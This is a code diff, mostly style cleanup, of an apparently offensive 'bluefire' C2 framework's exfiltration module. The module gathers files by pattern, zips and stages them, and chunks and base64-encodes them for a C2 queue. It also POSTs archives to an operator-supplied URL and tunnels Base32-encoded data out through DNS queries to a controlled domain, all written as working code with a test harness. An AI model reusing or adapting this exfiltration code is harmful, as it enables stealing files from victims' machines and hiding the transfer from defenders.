@@ -3,33 +3,29 @@ Exfiltration Module
 Handles collection and exfiltration of data.
 """
 
-import os
-import sys
-import time
-import random
-import string
 import base64
-import zipfile
-import tempfile
 import logging
-import glob
-import shutil
-import threading
-import socket # For basic DNS lookup simulation
 import math
-from pathlib import Path
-from typing import Dict, List, Any, Optional, Tuple
+import os
+import shutil
+import socket  # For basic DNS lookup simulation
+import tempfile
+import threading
+import time
+import zipfile
 from datetime import datetime
+from pathlib import Path
+from typing import TYPE_CHECKING, Any, Dict, List, Optional, Tuple
+
 import requests
 
 # Avoid circular import for type hinting
 if TYPE_CHECKING:
     from ..command_control.command_control import CommandControl
-    from ..execution.execution import Execution # May need later for compression tools
 
 class Exfiltration:
     """Handles data collection and exfiltration techniques."""
-    
+
     # Inject CommandControl to access its outbound queue/mechanism
     def __init__(self, command_control_module: Optional['CommandControl'] = None):
         self.command_control = command_control_module
@@ -101,7 +97,7 @@ class Exfiltration:
             result["errors"] = errors
 
         return result
-        
+
     def _collect_files(self, details: Dict[str, Any]) -> Tuple[List[str], int, List[str]]:
         """Collects files based on paths, patterns, and limits."""
         paths_to_search = details.get("paths", [])
@@ -110,15 +106,17 @@ class Exfiltration:
         max_total_kb = details.get("max_total_exfil_kb", self.config["default_max_total_exfil_kb"])
         max_files = details.get("max_files", self.config["default_max_files"])
         recursive = details.get("recursive", True)
-        
+
         collected_files = []
         skipped_files = []
         total_size_kb = 0
         checked_count = 0
 
-        if not isinstance(paths_to_search, list): paths_to_search = [paths_to_search]
-        if not isinstance(patterns, list): patterns = [patterns]
-        
+        if not isinstance(paths_to_search, list):
+            paths_to_search = [paths_to_search]
+        if not isinstance(patterns, list):
+            patterns = [patterns]
+
         self.logger.info(f"Starting file collection. Paths: {paths_to_search}, Patterns: {patterns}, MaxFiles: {max_files}, MaxFileSizeKB: {max_size_kb}, MaxTotalKB: {max_total_kb}")
 
         for start_path_str in paths_to_search:
@@ -150,11 +148,11 @@ class Exfiltration:
                 if len(collected_files) >= max_files:
                      self.logger.warning(f"Reached max file limit ({max_files}). Stopping collection.")
                      break # Stop outer loop too?
-                     
+
                 # If searching a directory, check if item is a file
                 if is_dir_search and not item_path.is_file():
                     continue # Skip directories when iterating a directory path
-                
+
                 # Check against patterns
                 matches_pattern = False
                 for pattern in patterns:
@@ -174,7 +172,7 @@ class Exfiltration:
                          # self.logger.debug(f"Skipping {item_path} (size {file_size_kb:.2f}KB > max {max_size_kb}KB)")
                          skipped_files.append(f"{item_path} (Too Large)")
                          continue
-                    
+
                     if (total_size_kb + file_size_kb) > max_total_kb:
                          self.logger.warning(f"Reached max total size ({max_total_kb}KB). Cannot add {item_path}. Stopping collection.")
                          skipped_files.append(f"{item_path} (Exceeds Total Limit)")
@@ -194,7 +192,7 @@ class Exfiltration:
 
             if len(collected_files) >= max_files or total_size_kb >= max_total_kb:
                  break # Stop searching other paths if limits reached
-                 
+
         self.logger.info(f"File collection finished. Collected {len(collected_files)} files, Total Size: {total_size_kb:.2f}KB. Skipped {len(skipped_files)} files. Checked {checked_count} items.")
         return collected_files, total_size_kb, skipped_files
 
@@ -204,10 +202,10 @@ class Exfiltration:
         archive_password = details.get("archive_password")
         compression_level = details.get("compression_level", zipfile.ZIP_DEFLATED) # zipfile specific
         staging_base = self.config.get("staging_dir_base")
-        
+
         staging_dir = tempfile.mkdtemp(prefix="bluefire_exfil_", dir=staging_base)
         self.logger.info(f"Created staging directory: {staging_dir}")
-        
+
         archive_name_base = f"exfil_pkg_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
         archive_path = None
         error_msg = ""
@@ -224,7 +222,7 @@ class Exfiltration:
                       while staged_path.exists():
                           counter += 1
                           staged_path = Path(staging_dir) / f"{file_path.stem}_{counter}{file_path.suffix}"
-                          
+
                       shutil.copy2(file_path, staged_path) # copy2 preserves metadata
                       staged_files_map[file_path_str] = str(staged_path)
                  except Exception as e:
@@ -247,14 +245,14 @@ class Exfiltration:
                     for original_path, staged_path in staged_files_map.items():
                          # Add files to archive using their original basename
                          zipf.write(staged_path, arcname=Path(original_path).name)
-            
+
             # Add elif for tarfile here if needed (.tar.gz, .tar.bz2)
-            
+
             else:
                 raise ValueError(f"Unsupported archive format: {archive_format}")
-            
+
             self.logger.info(f"Archive created successfully: {archive_path}")
-            
+
         except Exception as e:
             self.logger.error(f"Error during staging/archiving: {e}", exc_info=True)
             error_msg += f" Archiving failed: {e}"
@@ -263,19 +261,19 @@ class Exfiltration:
             # Optionally clean up individual staged files if archive created?
             # For simplicity, we rely on cleaning up the whole staging dir later.
             pass
-            
+
         return archive_path, error_msg # Return path to archive or None, and any errors
 
     def _handle_exfil_via_c2(self, details: Dict[str, Any]) -> Dict[str, Any]:
         """Collects, optionally archives, chunks, encodes, and queues data for C2 exfil."""
         if not self.command_control:
              return {"status": "error", "message": "CommandControl module unavailable for C2 exfil."}
-             
+
         chunk_size_kb = details.get("chunk_size_kb", self.config["default_chunk_size_kb"])
         chunk_size_bytes = int(chunk_size_kb * 1024)
         do_archive = details.get("archive", True)
         cleanup_staging = details.get("cleanup", True)
-        
+
         result_details = {
              "collection_details": details, # Include collection params
              "archived": do_archive,
@@ -296,7 +294,7 @@ class Exfiltration:
             result_details["files_skipped"] = skipped
             result_details["files_collected_count"] = len(collected_files)
             result_details["total_size_kb"] = round(total_kb, 2)
-            
+
             if not collected_files:
                 raise FileNotFoundError("No files collected matching criteria.")
 
@@ -311,7 +309,8 @@ class Exfiltration:
                       # Staging dir cleanup handled later
                       staging_dir_to_clean = os.path.dirname(archive_path)
                       result_details["archive_file"] = archive_path
-                      if archive_errors: result_details["archive_warnings"] = archive_errors
+                      if archive_errors:
+                          result_details["archive_warnings"] = archive_errors
                  else:
                       # Failed to archive, attempt to exfil individual files?
                       # For now, treat archive failure as overall failure if archive=True
@@ -333,12 +332,13 @@ class Exfiltration:
                     with open(source_path_to_read, 'rb') as f:
                         while True:
                             chunk = f.read(chunk_size_bytes)
-                            if not chunk: break # End of file
-                            
+                            if not chunk:
+                                break # End of file
+
                             encoded_chunk = base64.b64encode(chunk).decode('ascii')
                             chunk_index += 1
                             bytes_sent += len(chunk)
-                            
+
                             # Construct data payload for C2 queue
                             # This needs to be understood by the C2 module's beacon worker
                             exfil_payload = {
@@ -350,7 +350,7 @@ class Exfiltration:
                                 # Add total size/chunks? Complicates things.
                                 # Keep it simple for now.
                             }
-                            
+
                             # Add payload to C2 queue (Needs implementation in C2 module)
                             if hasattr(self.command_control, 'queue_outgoing_data'):
                                  self.command_control.queue_outgoing_data(exfil_payload)
@@ -365,7 +365,7 @@ class Exfiltration:
                             self.logger.debug(f"Queued chunk {chunk_index} for {file_basename} ({len(chunk)} bytes) for C2 exfil.")
                             result_details["exfil_data_queued"] = True
                             result_details["chunks_sent_count"] = chunk_index
-                            
+
                             # TODO: Add potential delay between chunks?
 
                     status = "success"
@@ -373,12 +373,16 @@ class Exfiltration:
 
                 except FileNotFoundError:
                      raise # Already caught if source_path is None
-                except IOError as e:
-                     raise IOError(f"Error reading file {source_path_to_read}: {e}")
-                except NotImplementedError as e:
+                except OSError as e:
+                    raise OSError(
+                        f"Error reading file {source_path_to_read}: {e}"
+                    ) from e
+                except NotImplementedError:
                     raise # Propagate queue error
                 except Exception as e:
-                     raise Exception(f"Error during chunking/queuing: {e}")
+                    raise RuntimeError(
+                        f"Error during chunking/queuing: {e}"
+                    ) from e
             else:
                 # This case implies archive failed or no files collected
                 # Error should have been raised earlier
@@ -400,7 +404,8 @@ class Exfiltration:
                       self.logger.info(f"Cleaned up staging directory: {staging_dir_to_clean}")
                  except Exception as e:
                       self.logger.warning(f"Failed to clean up staging directory {staging_dir_to_clean}: {e}")
-                      if "error" not in result_details: result_details["error"] = ""
+                      if "error" not in result_details:
+                          result_details["error"] = ""
                       result_details["error"] += f" | Cleanup Warning: Failed to delete {staging_dir_to_clean}"
             elif archive_file_to_clean and not staging_dir_to_clean: # Handle cleanup if only archive created, no staging dir var set
                  # This case might occur if staging failed but archive path was somehow returned
@@ -437,7 +442,7 @@ class Exfiltration:
             return {"status": "error", "message": result_details["error"], "details": result_details}
 
         result_details["target_url"] = http_post_url
-        
+
         try:
             # 1. Collect Files
             collected_files, total_size_kb, skipped_files = self._collect_files(details)
@@ -453,7 +458,7 @@ class Exfiltration:
             result_details["archive_path"] = staged_archive_path
             if not staged_archive_path or not os.path.exists(staged_archive_path):
                  raise FileNotFoundError("Failed to create or find the staged archive file.")
-            
+
             # 3. Send via HTTP POST
             self.logger.info(f"Attempting to exfiltrate archive {staged_archive_path} via HTTP POST to {http_post_url}")
             headers = details.get("headers", {})
@@ -465,15 +470,15 @@ class Exfiltration:
 
             with open(staged_archive_path, 'rb') as f_archive:
                  try:
-                      response = requests.post(http_post_url, data=f_archive, 
+                      response = requests.post(http_post_url, data=f_archive,
                                                  headers=headers, verify=verify_ssl, timeout=timeout)
                       response.raise_for_status() # Check for HTTP errors
-                      
+
                       status = "success"
                       result_details["http_status_code"] = response.status_code
                       result_details["response_snippet"] = response.text[:200] # Log beginning of response
                       self.logger.info(f"Successfully POSTed archive to {http_post_url}. Status: {response.status_code}")
-                      
+
                  except requests.exceptions.RequestException as req_err:
                       result_details["error"] = f"HTTP POST request failed: {req_err}"
                       self.logger.error(result_details["error"])
@@ -550,7 +555,7 @@ class Exfiltration:
             self.logger.info("Step 3: Encoding data and simulating DNS queries...")
             with open(archive_path, 'rb') as f:
                 archive_data = f.read()
-            
+
             # Use Base32 for DNS label compatibility (alphanumeric), remove padding
             encoded_data = base64.b32encode(archive_data).decode('ascii').rstrip('=')
             self.logger.debug(f"Encoded data length: {len(encoded_data)} chars (Base32)")
@@ -562,7 +567,7 @@ class Exfiltration:
                 chunk = encoded_data[i * chunk_size : (i + 1) * chunk_size]
                 # Construct the FQDN: <chunk>.<chunk_index>.<session>.<domain>
                 fqdn = f"{chunk}.{i}.{session_id}.{controlled_domain}"
-                
+
                 # Check FQDN length constraints (max 253 total, max 63 per label)
                 if len(fqdn) > 253:
                      self.logger.warning(f"Skipping query, generated FQDN too long ({len(fqdn)} chars): {fqdn[:100]}..." )
@@ -593,13 +598,13 @@ class Exfiltration:
                 except Exception as e:
                      self.logger.error(f"Unexpected error during simulated DNS query for {fqdn}: {e}")
                      failed_queries += 1
-            
+
             if simulated_queries > 0 and failed_queries < simulated_queries:
                 status = "success" # Assume success if most queries simulated without error
                 reason = f"Simulated {simulated_queries} DNS queries for {len(encoded_data)} chars of data. {failed_queries} queries failed lookup (may be expected)."
                 self.logger.info("DNS Tunnel simulation finished.")
             else:
-                 reason = f"DNS Tunnel simulation failed. Attempted {simulated_queries} queries, {failed_queries} failed." 
+                 reason = f"DNS Tunnel simulation failed. Attempted {simulated_queries} queries, {failed_queries} failed."
                  self.logger.error(reason)
 
         except FileNotFoundError as e:
@@ -643,7 +648,7 @@ class Exfiltration:
 # Example Usage (for testing)
 if __name__ == '__main__':
     import json
-    
+
     logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 
     # Mock CommandControl with a queue for testing
@@ -653,45 +658,48 @@ if __name__ == '__main__':
             self.results_lock = threading.Lock() # Mimic lock if using results queue
             self.task_results_queue = self.outgoing_queue # Use same queue for fallback
             self.logger = logging.getLogger("MockC2")
-            
+
         def queue_outgoing_data(self, data: Dict[str, Any]):
             self.logger.info(f"[MockC2] Queued outgoing data: { {k: v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v for k, v in data.items()} }")
             self.outgoing_queue.append(data)
-            
+
         def get_queued_data(self):
             return self.outgoing_queue[:]
-            
+
     mock_c2 = MockCommandControl()
     exfil_module = Exfiltration(command_control_module=mock_c2)
     # exfil_module.update_config({}) # Load actual config here if needed
 
-    # --- Setup Test Files --- 
+    # --- Setup Test Files ---
     test_dir = tempfile.mkdtemp(prefix="bluefire_exfil_testdir_")
     file_paths_created = []
     try:
         # Create some dummy files
         content1 = "This is sensitive file one." * 500 # Make it ~10KB
         path1 = os.path.join(test_dir, "secret_doc.txt")
-        with open(path1, "w") as f: f.write(content1)
+        with open(path1, "w") as f:
+            f.write(content1)
         file_paths_created.append(path1)
-        
-        content2 = "{"key": "value", "data": [1, 2, 3]}" * 100 # Small JSON
+
+        content2 = '{"key": "value", "data": [1, 2, 3]}' * 100 # Small JSON
         path2 = os.path.join(test_dir, "config.json")
-        with open(path2, "w") as f: f.write(content2)
+        with open(path2, "w") as f:
+            f.write(content2)
         file_paths_created.append(path2)
-        
+
         # Create a larger file to test size limits
         content3 = "Large file content." * 100000 # ~1.8MB
         path3 = os.path.join(test_dir, "large_log.log")
-        with open(path3, "w") as f: f.write(content3)
+        with open(path3, "w") as f:
+            f.write(content3)
         file_paths_created.append(path3)
-        
+
         print(f"Created test directory and files: {test_dir}")
-        
-        # --- Test Case 1: Collect txt and json, archive, exfil via C2 --- 
+
+        # --- Test Case 1: Collect txt and json, archive, exfil via C2 ---
         print("\n--- Test Case 1: Archive *.txt, *.json via C2 ---")
         exfil_request_1 = {"exfiltrate": {
-            "method": "via_c2", 
+            "method": "via_c2",
             "details": {
                 "paths": [test_dir],
                 "patterns": ["*.txt", "*.json"],
@@ -705,11 +713,11 @@ if __name__ == '__main__':
         print(f"Mock C2 Queue length: {len(mock_c2.get_queued_data())}")
         # print(f"First chunk data (first 50 chars): {mock_c2.get_queued_data()[0].get('data_b64', '')[:50]}")
         mock_c2.outgoing_queue.clear() # Clear queue for next test
-        
-        # --- Test Case 2: Collect log file (too large), should be skipped --- 
+
+        # --- Test Case 2: Collect log file (too large), should be skipped ---
         print("\n--- Test Case 2: Collect large log (should skip) via C2 ---")
         exfil_request_2 = {"exfiltrate": {
-            "method": "via_c2", 
+            "method": "via_c2",
             "details": {
                 "paths": [test_dir],
                 "patterns": ["*.log"],
@@ -723,10 +731,10 @@ if __name__ == '__main__':
         print(f"Mock C2 Queue length: {len(mock_c2.get_queued_data())}") # Should be 0
         mock_c2.outgoing_queue.clear()
 
-        # --- Test Case 3: Collect all, no archive --- 
+        # --- Test Case 3: Collect all, no archive ---
         print("\n--- Test Case 3: Collect all (no archive) via C2 - sends first file only ---")
         exfil_request_3 = {"exfiltrate": {
-            "method": "via_c2", 
+            "method": "via_c2",
             "details": {
                 "paths": [test_dir],
                 "patterns": ["*"],
@@ -741,11 +749,11 @@ if __name__ == '__main__':
         mock_c2.outgoing_queue.clear()
 
     finally:
-        # --- Cleanup --- 
+        # --- Cleanup ---
         print(f"\n--- Cleaning up test directory: {test_dir} ---")
         if os.path.exists(test_dir):
              try:
                   shutil.rmtree(test_dir)
                   print("Test directory removed.")
              except Exception as e:
-                  print(f"Error removing test directory {test_dir}: {e}") 
+                  print(f"Error removing test directory {test_dir}: {e}")
